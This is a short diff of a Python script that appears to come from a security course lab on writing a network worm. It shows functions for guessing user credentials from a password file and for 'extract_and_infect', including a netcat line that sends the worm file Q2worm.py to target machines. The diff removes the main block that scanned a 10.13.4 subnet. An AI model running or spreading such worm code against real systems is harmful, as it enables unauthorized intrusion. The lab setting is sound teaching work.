@@ -25,7 +25,7 @@ def find_vulnerable_users():
     sys.tracebacklimit=0
     #client = paramiko.client.SSHClient()
     #client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    with open("/home/cse/Lab2/Q2pwd") as file:
+    with open("../../lab2/Q2pwd") as file:
         user_combos = file.readlines()
     user_combos = [u.strip().split(" ")for u in user_combos]
 
@@ -110,11 +110,4 @@ def extract_and_infect():
         subprocess.run(["nc", "-q", "1", ip, "1234"], stdin=open("Q2worm.py"))
         tn.close()
 
-if __name__ == '__main__':
-    t0 = time()
-    ip_bytes = "10.13.4"
-    find_vulnerable_machines(ip_bytes)
-    find_vulnerable_users()
-    extract_and_infect()
-    tf = time()
-    print(f"Total time: {int((tf-t0)/60)} minutes and {int((tf-t0)%60)} seconds.")
+# This file should not be run locally
